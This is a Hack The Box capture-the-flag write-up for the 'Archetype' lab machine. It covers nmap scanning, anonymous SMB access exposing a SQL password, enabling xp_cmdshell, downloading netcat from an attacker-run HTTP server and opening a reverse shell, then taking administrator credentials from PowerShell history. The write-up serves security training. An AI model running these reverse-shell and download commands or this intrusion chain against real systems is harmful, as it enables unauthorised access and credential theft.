# Archetype CTF - HACK THE BOX - WRITE-UP 

# Enumeration
First step of any Penetration Testing is Enumeration. Nmap with the next flags gives us all comprehensive information:

``` bash
-sC #Scanning using default scripts (but some of them are cotegorized as intrusive!!)
-sV #Prints versions of listening services
```

After the scan we can identify some interesting points, which could be vulnerable:
``` bash
nmap -sC -sV <10.129.159.77>

PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-info: 
|   10.129.159.77:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2026-05-16T04:56:48+00:00; +1s from scanner time.
| ms-sql-ntlm-info: 
|   10.129.159.77:1433: 
|     Target_Name: ARCHETYPE
|     NetBIOS_Domain_Name: ARCHETYPE
|     NetBIOS_Computer_Name: ARCHETYPE
|     DNS_Domain_Name: Archetype
|     DNS_Computer_Name: Archetype
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-05-16T04:27:01
|_Not valid after:  2056-05-16T04:27:01
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-05-16T04:56:39
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-05-15T21:56:43-07:00
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h24m01s, deviation: 3h07m52s, median: 0s
```

### SMB CLIENT:
The Server Message Blocks (SMB service) allows anonymous access via guest authentication (through a null session):
```bash 
445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
SNIP
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user  
```

[**Server Message Block** ](https://en.wikipedia.org/wiki/Server_Message_Block)(by default on port 445) - operates on Application Layer of TCP/IP stack. Protocol is used for share files, printers, serial ports and different communication
between nodes on a network on Windows-Based Machines.

**What means  "anonymous access via guest authentication"? Why is it vulnerable?**
Guest Access means that the server allows **connection without valid credential** (without any password or login), typically mapping  the session (named null session) to the **Guest account.** **Allowing this kind of sessions is the typical misconfiguration of SMB service.**

#### MSSQL Database
```bash
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-info: 
|   10.129.159.77:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
```
 
**[Microsoft SQL Server (MSSQL)](https://en.wikipedia.org/wiki/Microsoft_SQL_Server)** (by default on port 1433)- proprietary **relational database management system (RDMS)** (system used to control relational databases, which stores data in excels) developed by Microsoft using SQL. Main function (typical for databases) - storing and retrieving data as requested by other software applications.

Within the Security Assessment (Penetration Testing) information, which this database contains, might be very valuable for us (and obviously for users, who utilize it).
#### WinRM 
``` bash
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

**[Windows Remote Manager (WinRM)](https://en.wikipedia.org/wiki/Windows_Remote_Management)** (by default on ports 5985(HTTP)/5986(HTTPS)) -  Microsoft Implementation used for Secure Remote Code Execution on the Remote Windows Computers. As been said.  **With valid credentials WinRM becomes a potential lateral movement vector.** 

---

## SMB Client Exploitation
As been said previously, SMB allows connection within null-session (in guest/anonymous mode). Using  `smbclient` with flags `-N` (for skipping authentication and enter as a guest) and `-L` (for list all available shares), we can see next output: 

```shell
smbclient -NL 10.129.159.77              
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backups         Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
SMB1 disabled -- no workgroup available
```

From all available shares we have access to only one - `backups`, so we can enter and download its content -  `prod.dtsConfig`

```bash
smbclient -N \\\\10.129.159.77\\backups
smb: \> dir
  .                                   D        0  Mon Jan 20 12:20:57 2020
  ..                                  D        0  Mon Jan 20 12:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 12:23:02 2020
```

Content of the downloaded file looks complex, but we can extract some very valuable information: `Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc`

```sql
cat prod.dtsConfig 
<SNIP>
<ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
<SNIP>
```

#### Impacket - Packet Building
With the obtained credentials we can try to connect to the MSSQL Database, as was mentioned above. For this purpose we can utilize [Impacket](https://github.com/fortra/impacket.git) - "collection of python classes", which is utilized for low-level communication between service (protocol) and client on the packet level. 

We use **mssqlclient.py script for establishing connection**, using `-windows-auth` flag for the authentication via NTLM (directly through Windows), instead of basic SQL Authentication and providing obtained credentials. 
``` bash
python3 mssqlclient.py ARCHETYPE/sql_svc@10.129.160.52 -windows-auth -debug
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /home/personanongratta/.pyenv/versions/3.12.8/lib/python3.12/site-packages/impacket
Password: <M3g4c0rp123>
[*] Encryption required, switching to TLS
[+] Computed MIC is 1bc461caebeabf5b8730acc3bfa23e1c
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2017 RTM (14
```

We established connection! But, **how does it works?** Client communicates with **MSSQL** via **TDS** (Tabular Data Stream) (like browser with web via HTTP) (packet format communication) usually using official Microsoft Clients, but if we are on **Linux? What should we do?** Impacket had constructed from scratch TDS packets, using python, as a result we successfully connected to the MSSQL, using credentials.  

---
# Foothold
Finally, we have got the access to the MSSQL Database!
```bash
SQL (ARCHETYPE\sql_svc  dbo@master)> help

    lcd {path}                 - changes the current local directory to {path}
    exit                       - terminates the server process (and this session)
    enable_xp_cmdshell         - you know what it means
    disable_xp_cmdshell        - you know what it means
    enum_db                    - enum databases
    enum_links                 - enum linked servers
    enum_impersonate           - check logins that can be impersonated
    enum_logins                - enum login users
    enum_users                 - enum current db users
    enum_owner                 - enum db owner
    exec_as_user {user}        - impersonate with execute as user
    exec_as_login {login}      - impersonate with execute as login
    xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
    xp_dirtree {path}          - executes xp_dirtree on the path
    sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
    use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
    enable_rpc {link}          - enable RPC Out for a linked server
    disable_rpc {link}         - disable RPC Out for a linked server
    ! {cmd}                    - executes a local shell cmd
    upload {from} {to}         - uploads file {from} to the SQLServer host {to}
    download {from} {to}       - downloads file from the SQLServer host {from} to {to}
    show_query                 - show query
    mask_query                 - mask query
```

Basic enumeration using suggested commands didn't gave us any valuable information, so according to this [article](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet) , we can enumerate it more deeply and list our current (and possible) privileges for future escalation. 

Let's check whether we are part of the system administrative group, using SQL Language:
```bash
SQL (ARCHETYPE\sql_svc  dbo@master)> SELECT is_srvrolemember('sysadmin');
    
-   
1   
```
Output “1” means that we are already system administrator — we are tho most privileged user (system administrator).

For this reason we can enable `xp_cmdshell `for executing system commands, going beyond the borders of database and manipulating the whole system.
``` bash
enable_xp_cmdshell 
or
EXEC sp_configure 'show advanced options', 1;
```

Using options `powershell -c `we can execute powershell commands, but this is too complicated, so we can try to upload a reverse shell, using netcat and python simple http server for transmitting.
```bash
SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell "powershell -c pwd"

output                
-------------------   
NULL                  
Path                  
----                  
C:\Windows\system32    
```

Since we are in the system32 folder, we need to find directory, where we are able to upload and execute file. For this purpose we can utilize our user’s (sql_svc) “Downloads” directory.
```bash
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads"
```

We launch python http server for transmitting `nc64.exe` file between systems:
```python
Documents sudo python3 -m http.server 999
Serving HTTP on 0.0.0.0 port 999 (http://0.0.0.0:999/) ...
10.129.160.52 - - [16/May/2026 16:42:57] "GET /nc64.exe HTTP/1.1" 200 -
```

```powershell
 xp_cmdshell "powershell -cd C:\Users\sql_svc\Downloads; wget http://10.10.15.74:999/nc64.exe -outfile nc64.exe"
```
#### NC64.exe
`nc64.exe `is a windows-version of basic netcat programm. Basically, netcat is a utility used for variety tasks associated with TCP or UDP. With the help of netcat we can obtain reverse shell, but before it we need to launch netcat listener on our own machine.

``` bash
sudo nc -nlvp 443                            
Listening on 0.0.0.0 443
```

```bash
-n #numeric-only IP addresses
-l #listening mode for inbound connections
-v #vervose output
-p #local port
```

We launch netcat, with flag `-e` which after connection launches cmd.exe `(windows command line)` and redirects input and output to our the machine.
``` powershell
 SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.15.74 443"
```

Finally, we have successfully obtained reverse shell. **But does it works?**
```bash
C:\Users\sql_svc\Downloads>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9565-0B4F

 Directory of C:\Users\sql_svc\Downloads

05/16/2026  09:39 AM    <DIR>          .
05/16/2026  09:39 AM    <DIR>          ..
05/16/2026  09:42 AM            45,272 nc64.exe
               1 File(s)         45,272 bytes
               2 Dir(s)  10,722,156,544 bytes free
```

#### Reverse Shell
A reverse shell is a type of remote shell where the target machine initiates a connection back to the attacker’s machine, allowing the attacker to execute commands remotely. It is commonly used because firewalls and NAT devices often block incoming connections but allow outgoing connections.

```powershell
C:\Users\sql_svc\Downloads>dir C:\Users\sql_svc\Desktop 
dir C:\Users\sql_svc\Desktop 
 Volume in drive C has no label.
 Volume Serial Number is 9565-0B4F

 Directory of C:\Users\sql_svc\Desktop

01/20/2020  06:42 AM    <DIR>          .
01/20/2020  06:42 AM    <DIR>          ..
02/25/2020  07:37 AM                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)  10,722,156,544 bytes free
```

User Flag can be found here:
``` powershell
C:\Users\sql_svc\Downloads>type C:\Users\sql_svc\Desktop\user.txt
type C:\Users\sql_svc\Desktop\user.txt
3e7b102e78218e935bf3f4951fec21a3
```

`3e7b102e78218e935bf3f4951fec21a3` - User flag

---

# Privilege Escalation
In the same way, as a reverse shell we upload to the machine **[winPEAS](https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/winPEASps1/README.md)** - 
``` powershell
wget http://10.10.15.74:999/winPEASx64.exe -outfile winPEASx64.exe
```

`winPEASx64.exe `- software, which automatically analyzes the whole system and tries to find useful CVE's/Exploits/Vulnerabilities or Privilege Escalation Ways.

``` powershell
 Check if you can escalate privilege using some enabled token 
    SeAssignPrimaryTokenPrivilege: DISABLED
    SeIncreaseQuotaPrivilege: DISABLED
    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeImpersonatePrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeCreateGlobalPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT,  
    <SNIP>
C:\Users\sql_svc\AppData\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

```
We have found 2 interest attack vectors `SeImpersonatePrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED`, which makes machine vulnerable to the **[ juicy-potato exploit](https://github.com/ohpe/juicy-potato)** (or to the **[GodPotato](https://github.com/BeichenDream/GodPotato)**/**[PrintSpoofer](https://github.com/itm4n/PrintSpoofer)** on newer systems).

But firstly, we must check another possible way, which makes our performing goal much easier - `ConsoleHost_history.txt` file, which contains user's command history (since we are sys. admin, it can be very useful)
```powershell
PS C:\Users\sql_svc\Downloads> type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit
```

`administrator MEGACORP_4dm1n!!` - we found  administrator's credentials!

---
# Lateral Movement
For establishing connection with mentioned in the Enumeration Section Windows Remote Manager (WinRM) we must use **[evil-winrm](https://github.com/hackplayers/evil-winrm)** and set our new credentials!
```bash
evil-winrm -i 10.129.162.36 -u administrator
/usr/lib/ruby/gems/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining 'object_id' may cause serious problems
/usr/lib/ruby/gems/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining 'object_id' may cause serious problems
Enter Password: 
                                        
Evil-WinRM shell v3.9
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
archetype\administrator
```

Root Flag could be found here:
```
type C:\Users\Administrator\Desktop\root.txt 
```    

`b91ccec3305e98240082d4474b848528` - root flag

Now, we are totally free - we can generate ssh-keys for future connections, set up backdoor or rootkit or compromise all user's data.
